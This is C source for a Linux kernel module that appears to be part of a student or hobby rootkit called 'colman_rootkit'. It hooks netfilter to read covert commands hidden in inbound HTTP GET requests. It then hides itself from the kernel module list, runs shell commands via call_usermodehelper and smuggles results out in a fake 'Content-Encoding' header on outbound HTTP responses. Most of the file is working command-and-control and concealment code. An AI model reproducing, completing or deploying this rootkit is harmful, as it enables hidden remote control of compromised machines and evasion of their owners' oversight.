#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/version.h>
#include <linux/delay.h>
#include <net/ip.h>
#include <linux/kthread.h> 
#include "hidder.h"
#include "cnc.h"
#include "intercom.h"
#include "signals.h"


static struct task_struct *thread1 = NULL;


#define MALWARE_FUNC "colman-function"
#define MALWARE_ARG "colman-arg"

int find_malware_struct(void * address, char * string);

struct nf_hook_ops http_hook_out;
struct nf_hook_ops http_hook_in;


unsigned int http_callback( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));
void set_result_msg(char * result_msg, size_t msg_len);

typedef enum {
	TEST = 0,
	KEYLOGGER,
	SELF_HIDE,
	UN_SELF_HIDE,
	SHELL,
	KILL
}COMMANDS;

#define MAX_HTTP_HEADER_LEN 2048
#define MAX_HTTP_DATA_LEN 1024
#define MINIMUM_CNC_DATA 170-24
#define MAX_COMMAND_LEN 500

#define GET 0x20544547
#define HTTP_OK 0x50545448
#define RESULT_HEADER_STR "Content-Encoding: "

#define TOT_HDR_LEN 28

typedef struct _result_msg{
	char * msg;
	int len;
}result_msg;

result_msg * global_result_msg = NULL;

char result_ready = 0;

void set_result_msg(char * result_msg, size_t msg_len)
{
	if (global_result_msg == NULL)
	{
		global_result_msg = kmalloc(sizeof(result_msg), GFP_ATOMIC);
	}
	else
	{
		kfree(global_result_msg->msg);
		result_ready = 1;
	}
	global_result_msg->msg = (char *)kmalloc(sizeof(char) * msg_len, GFP_ATOMIC);
	global_result_msg->len = msg_len;
	memcpy(global_result_msg->msg, result_msg, msg_len);
}

unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_src_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	int offset = 0, len = 0;
  	char result_header[] = RESULT_HEADER_STR;
  	char result_header_end[] = "\r\n";
  	char* ptr;
	int result_msg_len;
	unsigned int space_left = 0;
	if (result_ready == 0)
		return NF_ACCEPT;
	
	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_src_port = ntohs(tcph->source);

	if (80 != tcp_src_port) {
		return NF_ACCEPT;
	}

	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	httph = (u32 *)tcp_data;
	
	if (*httph != HTTP_OK) { // Not GET
		return NF_ACCEPT;
	}

	//printk("[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk("[+] Colman: HTTP GET DETECTED -> CHANGE PACKET\n");
	

	if (unlikely(skb_linearize(pskb) != 0))
	{
		printk("[-] Colman: not linear\n");
		return NF_ACCEPT;
	}

	space_left = skb_tailroom(pskb);
	if (space_left == 0)
	{
		printk("[-] Colman: check is needed\n");
		return NF_ACCEPT;	
	}
  	
	printk("[+] Colman: space left: %d\n", skb_tailroom(pskb));

    printk("[+] Colman: data_len: %d\n", ntohs(iph->tot_len));

    printk("[+] Colman: new data_len: %d\n", ntohs(htons(2 + ntohs(iph->tot_len))));

  	result_msg_len =  strlen(result_header) + strlen(result_header_end) + global_result_msg->len;
	printk("[+] Colman: len: %d\n", result_msg_len);

	if (space_left < result_msg_len)
	{
		// We can extend the space left
		printk("[-] Colman: Not enougth space\n");
		return NF_ACCEPT;
	}
  	ptr = (char*) skb_put(pskb, result_msg_len); 

  	if (!ptr)
  	{
		printk("[-] Colman: Something want wrong\n");
		return NF_ACCEPT;  		
  	}

  	memcpy(ptr, result_header, strlen(result_header));

  	if (!global_result_msg)
  	{
		printk("[-] Colman: No result\n");
		return NF_ACCEPT;  		
  	}


  	if (!global_result_msg->msg)
  	{
		printk("[-] Colman: No result\n");
		return NF_ACCEPT;  		
  	}

  	memcpy(ptr + strlen(result_header), global_result_msg->msg, global_result_msg->len);

  	memcpy(ptr + strlen(result_header) + global_result_msg->len, result_header_end, strlen(result_header_end));

    
    /* Manipulating necessary header fields */
    iph->tot_len = htons(result_msg_len + ntohs(iph->tot_len));
    printk("[+] Colman: New tot len 0x%x\n", iph->tot_len);
    //tcph->len = htons(tot_data_len + TCP_HDR_LEN);

    /* Calculation of IP header checksum */
    iph->check = 0;
    ip_send_check (iph);

    // /* Calculation of TCP checksum */
    tcph->check = 0;
    offset = skb_transport_offset(pskb);
    len = pskb->len - offset;
    tcph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_TCP, 0);

	//printk("[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk("[+] Colman: PACKET Changed\n");
	result_ready = 0;
	return NF_ACCEPT;
}

typedef struct _run_cmd_args{
	char * arg;
	unsigned int arg_len;	
}run_cmd_args;

static int run_usermode_cmd( void *arguments)
{

	struct subprocess_info *sub_info;
	char final_cmd[MAX_COMMAND_LEN];
	char * argv[] = { "/bin/sh", "-c", final_cmd , NULL };
	static char *envp[] = {
	    "HOME=/",
	    "TERM=linux",
	    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
	char tmp_output[] = "ls > /home/shahart/colman_rootkit/output";
	unsigned int arg_len = strlen(tmp_output);

	run_cmd_args * args = (run_cmd_args *)arguments;

	if (args == NULL)
	{
		printk("[-] Colman: Failed to pass arguments.");
		goto exit_thread;
	} 
	printk("[+] Colman: THREAD exit.\n");
	goto exit_thread;
 	//printk("here! len! %d\n", args->arg_len);
 	//run_cmd_args * a = (run_cmd_args *)arguments;
	
	
	//char output_file_cmd[] = " > /home/shahart/colman_rootkit/output";
	
	memcpy(final_cmd, tmp_output, arg_len);
	final_cmd[arg_len] = 0x0;
	
	//char * final_cmd = kmalloc(sizeof(char) * (strlen(arg) + strlen(output_file_cmd) + 2), GFP_ATOMIC );

	//memcpy(final_cmd, arg, strlen(arg));
	//memcpy(final_cmd + strlen(arg), output_file_cmd, strlen(output_file_cmd) + 1);


	printk("[+] Colman: command: %s.\n", final_cmd);
	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL,NULL,NULL );	
	if (!sub_info)
		goto exit_thread;

	call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );

exit_thread: 
	do_exit(0);
}


unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_dst_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	char command[MAX_COMMAND_LEN];
	int i = 0, index = 0;
	long command_num = 1;
	run_cmd_args cmd_arguments;
	iph = ip_hdr(pskb);
	if (NULL == iph) {
		return NF_ACCEPT;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		return NF_ACCEPT;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		return NF_ACCEPT;
	}

	tcp_dst_port = ntohs(tcph->dest);


	if (80 != tcp_dst_port) {
		return NF_ACCEPT;
	}


	if (!tcph->psh) { // TCP three-way handshake
		return NF_ACCEPT;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	if (tcp_data_len <= MINIMUM_CNC_DATA + strlen(MALWARE_FUNC)) {
		return NF_ACCEPT;
	}
	
	httph = (u32 *)tcp_data;
	
	if (*httph != GET ) { // Not GET
		return NF_ACCEPT;
	}
	printk("[+] Colman: HTTP GET DETECTED -> EXEC COMMANDS\n");
	//printk("[+] Colman: saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));

	index = find_malware_struct(tcp_data, MALWARE_FUNC);
	if (!index)
	{
		return NF_ACCEPT;
	}

	for (i = 2 ; tcp_data[index + strlen(MALWARE_FUNC) + i] != 0xd; i++)
	{
		command[i-2] = tcp_data[index + strlen(MALWARE_FUNC) + i];
		if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_FUNC) + i >= tcp_data_len - 1))
		{
			return NF_ACCEPT;
		}
	}
	command[i-2] = 0x0;

	printk("[+] Colman: cmd: %s\n", command);
	if (kstrtol(command, 10, &command_num) != 0)
	{
    	printk("[-] Colman: Invlid command.\n");
		return NF_ACCEPT;
	}

	switch ((COMMANDS)command_num) {
		case TEST :
			set_result_msg("file:start_web.sh", strlen("file:start_web.sh"));
			printk("[+] Colman: OK\n");
			break;
		case KILL:
			set_result_msg("Bye", strlen("Bye"));
			//Cannot kill from here, should be from main (we can change flag for closing)
			//clean_rootkit();
			break;
		case SELF_HIDE:
			set_result_msg("LKM is hide", strlen("LKM is hide"));
			set_dkom_lkm();
			break;
		case SHELL:
				index = find_malware_struct(tcp_data, MALWARE_ARG);
				if (!index)
				{
					set_result_msg("Command missing", strlen("Command missing"));
					return NF_ACCEPT;
				}
				for (i = 2; tcp_data[index + strlen(MALWARE_ARG) + i] != 0xd; i++)
				{
					command[i-2] = tcp_data[index + strlen(MALWARE_ARG) + i];
					if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_ARG) + i >= tcp_data_len - 1))
					{
						return NF_ACCEPT;
					}
				}
				command[i-2] = 0x0;

				//printk("arg: %s", command);
				
				cmd_arguments.arg_len = 0;

				if (thread1)
				{
					printk("[?] Colman: HERE!!");
					return NF_ACCEPT;
				}

				//thread1 = kthread_run(run_usermode_cmd, &cmd_arguments, "thread");

				set_result_msg("file:output", strlen("file:output"));
				break;
			//read to see ok->
			set_result_msg("Cmd got executed", strlen("Cmd got executed"));
			break;
			
		case UN_SELF_HIDE:
			set_result_msg("LKM is not hide", strlen("LKM is not hide"));
			unset_dkom_lkm();
			break;
		default:

			set_result_msg("Invalid command", strlen("Invalid command"));
			printk("[-] Colman: Invalid command - %ld\n", command_num);
			break;
	}
	
	return NF_ACCEPT;
}

int find_malware_struct(void * address, char * string)
{
	void * result = strstr((char *)address, string);
	if (result == NULL || result < address)
		return 0;
	return (int)(result - address);
}

void set_http_callback( void )
{


	set_result_msg("Init", strlen("Init"));
	http_hook_in.hook = (void *)http_callback_get_command;
	http_hook_in.hooknum = NF_INET_PRE_ROUTING;
	http_hook_in.pf = PF_INET;
	http_hook_in.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_in);
#else
	nf_register_hook(&http_hook_in);
#endif


	http_hook_out.hook = (void *)http_callback_result;
	http_hook_out.hooknum = NF_INET_POST_ROUTING;
	http_hook_out.pf = PF_INET;
	http_hook_out.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_out);
#else
	nf_register_hook(&http_hook_out);
#endif

}


void unset_http_callback ( void )
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_in);
#else
	nf_unregister_hook(&http_hook_in);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_out);
#else
	nf_unregister_hook(&http_hook_out);
#endif

	kfree(global_result_msg->msg);
	kfree(global_result_msg);
}

